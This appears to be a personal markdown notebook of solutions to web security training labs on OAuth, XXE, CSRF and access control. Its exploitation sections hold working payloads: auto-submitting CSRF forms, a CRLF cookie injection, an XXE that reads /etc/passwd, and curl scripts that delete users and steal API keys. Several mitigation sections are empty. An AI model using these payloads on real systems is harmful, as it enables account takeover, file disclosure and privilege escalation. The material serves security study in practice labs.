
### Lab: LAB-NAME-HERE

**Target**

**Vulnerability**

**Exploitation**

**Mitigation**

## OAuth authentication

### Lab: Forced OAuth profile linking

**Vulnerability**

Vulnerable component: `OAuth client application`

Exploitation technique: CSRF against `OAuth client application`

Impact: `OAuth client application` account takeover

Implementation issue in OAuth client application. The application does not contain proper `nonce` parameter during `authorization request` making OAuth flow vulnerable to CSRF attack. Successful exploitation of the flaw allows to associate attacker's controlled account on the identity provider with a victim's account on OAuth client application resulting in an account takeover.

**Exploitation**

1. An attacker initiates OpenID Connect flow on OAuth client application (blog).
2. Halt the flow (from [1]) just before OAuth service redirects the browser back to OAuth client application `redirect_uri`.
3. Prepare CSRF bait site with the following content (where `CODE` value is taken from the response from [2]:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://aca71f891eeb2a5bc1beada2008700a3.web-security-academy.net/oauth-linking">
      <input type="hidden" name="code" value="CODE" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

4. Trick the victim to vist the prepared site.

**Mitigation**

Implement and properly handle state (`nonce`) during OAuth `authorization request`:

    GET /authz?client_id=ID&response_type=CODE&scope=SCOPE&redirect_uri=REDIRECT_URI&state=NONCE


### Lab: Authentication bypass via OAuth implicit flow

### Lab: OAuth account hijacking via redirect_uri

## XML external entity (XXE) injection

### Lab: Exploiting XXE using external entities to retrieve files

    https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files

**Vulnerability**

**Exploitation**

Payload:

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```


**Mitigation**

## Cross-site request forgery (CSRF)

### Lab: CSRF vulnerability with no defenses

**Target**

    https://portswigger.net/web-security/csrf/lab-no-defenses

**Vulnerability**

Plain CSRF vulnerability. When you see a site with cookie-based sessions and there is no CSRF tokens used the good chances are the site is vulnerable.

**Exploitation**

1. Prepare CSRF bait site with the following content:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://accd1ff41f28b885c0cf05e5005a00b1.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="abc&#64;xyz&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

2. Trick a victim to vist the prepared site.

**Mitigation**

Use anti CSRF mechanism offered by the web framework you're using. Alternatively, implement robust anti CSRF mechanism (e.g. CSRF tokens) by your own.

### Lab: CSRF where token validation depends on request method

**Target**

    https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method

**Vulnerability**

An example of badly implemented anti CSRF mechanism. CSRF token is in place but it is only verified by the application on POST method processing. The application allows GETs as an alternative and does not verifies CSRF token while processing it.

**Exploitation**

1. Prepare CSRF bait site with the following content:

```
<img src="https://ac721fed1e1e6c0bc062176100e300f5.web-security-academy.net/my-account/change-email?email=abc5%40xyz.com">
```

2. Trick a victim to vist the prepared site.

**Mitigation**

Make sure to always verify the existance and freshness of CSRF token.


### Lab: CSRF where token validation depends on token being present

**Target**

    https://portswigger.net/web-security/csrf/lab-no-defenses

**Vulnerability**

An example of badly implemented anti CSRF mechanism. CSRF token is in place but it is only verified by the application when it is present.

**Exploitation**

1. Prepare CSRF bait site with the following content (note that `CSRF token` was removed):

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ac5c1fb81e71a616c03876ae00740061.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="abc&#64;xyz&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

2. Trick a victim to vist the prepared site.

**Mitigation**

Make sure to always verify the existance and freshness of CSRF token.

### Lab: CSRF where token is not tied to user session

**Target**

    https://portswigger.net/web-security/csrf/lab-token-not-tied-to-user-session

**Vulnerability**

An example of badly implemented anti CSRF mechanism. CSRF token is in place but tokens arge generated in one global pool and are valid for every session. 

**Exploitation**

1. Log in as a `carlos` user
2. Retrieve CSRF token for `carlos` with (where SESSION) is value of `carlos` session id:

```
$ curl -s --cookie session=SESSION https://acd81fd81e79befec0c22e7b00da004e.web-security-academy.net/my-account | grep \"csrf | awk -F"value" '{print $2}' | cut -d '"' -f2
```

3. Prepare CSRF bait site with the following content (where `TOKEN` is an aoutput from command from [2]):

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://acd81fd81e79befec0c22e7b00da004e.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="changed&#64;abc&#46;com" />
      <input type="hidden" name="csrf" value="TOKEN" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

4. Trick a victim to vist the prepared site.

**Mitigation**

Generate and use only session specific CSRF tokens valid only for this particular session.


### Lab: CSRF where token is tied to non-session cookie

**Target**

    https://portswigger.net/web-security/csrf/lab-token-tied-to-non-session-cookie

**Vulnerability**

**Exploitation**

```
url -d -s --cookie "session=vYm5cgNQ2E0iquIlRGbLN8FHHRCK4aJg;csrfKey=5wJWeNz38ZYTHW6zHASMDvbVn31Ip8e5" https://acce1fae1e59e5efc09a2f1900d800bb.web-security-academy.net/my-account | grep name=csrf | awk -F"value=" '{print $2}' | tr -d '>'
```

```
<html>
  <body>
  <img src="https://acce1fae1e59e5efc09a2f1900d800bb.web-security-academy.net/?search=trash;%0d%0aSet-Cookie:%20csrfKey=5wJWeNz38ZYTHW6zHASMDvbVn31Ip8e5">
  <script>history.pushState('', '', '/')</script>
    <form action="https://acce1fae1e59e5efc09a2f1900d800bb.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="changed&#64;abc&#46;com" />
      <input type="hidden" name="csrf" value="6e1mTbsHYSac7ZxYPVuLQUQLv6qgrLNK" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

**Mitigation**


### Lab: CSRF where token is duplicated in cookie

**Target**

    https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie

**Vulnerability**

**Exploitation**

```
<html>
  <body>
  <img src="https://ace51ff81ffda275c0e43c33006900b1.web-security-academy.net/?search=trash;%0d%0aSet-Cookie:%20csrf=5wJWeNz38ZYTHW6zHASMDvbVn31Ip8e5">
  <script>history.pushState('', '', '/')</script>
    <form action="https://ace51ff81ffda275c0e43c33006900b1.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="changed&#64;abc&#46;com" />
      <input type="hidden" name="csrf" value="5wJWeNz38ZYTHW6zHASMDvbVn31Ip8e5" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

**Mitigation**


### Lab: CSRF where Referer validation depends on header being present

**Target**

    https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-header-being-present

**Vulnerability**

**Exploitation**

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
 <meta name="referrer" content="never"> 
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://acf21faa1e585ed3c0ef2f7f005d006c.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="abc111&#64;xyz&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

**Mitigation**


### Lab: CSRF with broken Referer validation

**Target**

    https://portswigger.net/web-security/csrf/lab-referer-validation-broken

**Vulnerability**

**Exploitation**

Header:

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Referrer-Policy: unsafe-url
```

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/?ac021f8c1ed56638c0544264006900a4.web-security-academy.net')</script>
    <form action="https://ac021f8c1ed56638c0544264006900a4.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="abc111&#64;xyz&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

**Mitigation**

## Access control vulnerabilities

### Lab: Unprotected admin functionality

**Target**

**Vulnerability**

**Exploitation**

```
curl https://ac4d1fbb1eaed8dcc00d16c100c800cb.web-security-academy.net/robots.txt
curl https://ac4d1fbb1eaed8dcc00d16c100c800cb.web-security-academy.net/administrator-panel/delete?username=carlos
```

**Mitigation**


### Lab: Unprotected admin functionality with unpredictable URL

**Target**

**Vulnerability**

**Exploitation**

```
curl -s https://acc01f421fc75897c08337b3009f0006.web-security-academy.net/ | grep admin
curl -s -x 127.0.0.1:8081 https://acc01f421fc75897c08337b3009f0006.web-security-academy.net/admin-1lqn53/delete?username=carlos

```

**Mitigation**

### Lab: User role controlled by request parameter

**Target**

**Vulnerability**

**Exploitation**

1. Authenticate in the app as `wiener:peter`

2. Standard Match and replace (`Burp -> Proxy -> Options -> Match and Replace`) fails to replace `false` to `true` in a cookie so we use this extension: `https://github.com/PortSwigger/match-replace-session-action` for that.

With this [trickery](https://blog.z-labs.eu/2022/01/12/burp-suite-pro-authn-for-cli-tools.html) (i.e. exposing Burp session handling engine for command line tools) we can solve this in one shot: 

```
curl -k -x 127.0.0.1:8081 https://ac111f1d1fb6a221c142c01400b40093.web-security-academy.net/admin/delete?username=carlos
```

This replaces `Admin` cookie value from `false` to `true`.

**Mitigation**


### Lab: User role can be modified in user profile

**Target**

    https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile

**Vulnerability**

Broken access control.

**Exploitation**

```
curl -L -k -x 127.0.0.1:8081 https://ac7e1ffa1eb31a27c0a9179d002400d3.web-security-academy.net/admin/delete?username=carlos -d '"roleid": 2'
```

**Mitigation**

Role should be bound on the backend to the specific session. It shouldn't be possible to modify it via `roleid` parameter.


### Lab: URL-based access control can be circumvented

**Target**

    https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented

**Vulnerability**

The backend supports legacy `X-Original-URL` header. Details [here](https://www.acunetix.com/vulnerabilities/web/url-rewrite-vulnerability/).

**Exploitation**

```
curl -H 'X-Original-URL: /admin/delete' -L -k -x 127.0.0.1:8081 https://ac471fb31f0ddf40c0ee5cda006b0015.web-security-academy.net/?username=carlos
```

**Mitigation**

Drop support for `X-Original-URL` header.

### Lab: Method-based access control can be circumvented

**Target**

    https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented

**Vulnerability**

Broken access control for `GET` http metchod.

**Exploitation**

    curl -L -k -x 127.0.0.1:8081 https://ac911f011eed636ec0b35e63005b00d8.web-security-academy.net/admin-roles?username=wiener&action=upgrade

**Mitigation**

### Lab: User ID controlled by request parameter

**Target**

    https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter

**Vulnerability**

**Exploitation**

1. Set up Burp to provide authentication engine for command line tools (see: [here](https://blog.z-labs.eu/2022/01/12/burp-suite-pro-authn-for-cli-tools.html)
2. Log in via browser to the vulnerable application.
3. Exploit:

```
KEY=$(curl -s -k -x 127.0.0.1:8081 https://ac551fec1ffeda0ac0d82a8b004e00a0.web-security-academy.net/my-account?id=carlos | grep 'API Key' | cut -d'<' -f2 | awk -F' ' '{print $NF}'); curl -k -x 127.0.0.1:8081 https://ac551fec1ffeda0ac0d82a8b004e00a0.web-security-academy.net/submitSolution -d "answer=$KEY" 
```

**Mitigation**

### Lab: User ID controlled by request parameter, with unpredictable user IDs

**Target**

    https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids

**Vulnerability**

Broken access control. Horizontal escalation. GUID for other user (`carlos`) is leaked in blog content.

**Exploitation**

1. Set up Burp to provide authentication engine for command line tools (see: [here](https://blog.z-labs.eu/2022/01/12/burp-suite-pro-authn-for-cli-tools.html) for details).
2. Log in via browser to the vulnerable application.
3. Exploit:

```
cat > labSolution-user-id-controlled-by-request-parameter-with-unpredictable-user-ids.sh <<'EOF'
#!/bin/bash

URL=https://ac6e1f381f2ddfa3c0f690be00630094.web-security-academy.net

# search thru blog posts to find GUID for user carlos:
GUID=$(for i in $(seq 1 10); do curl -s -k -x 127.0.0.1:8081 ${URL}/post?postId=$i | grep userId; done | grep carlos | head -n 1 | cut -d"'" -f2 | cut -d'=' -f2)

# get carlos API key:
KEY=$(curl -s -k -x 127.0.0.1:8081 $URL/my-account?id=$GUID | grep 'API Key' | cut -d'<' -f2 | awk -F' ' '{print $NF}')

# submit solution:
curl -k -x 127.0.0.1:8081 $URL/submitSolution -d "answer=$KEY"

EOF
```

**Mitigation**
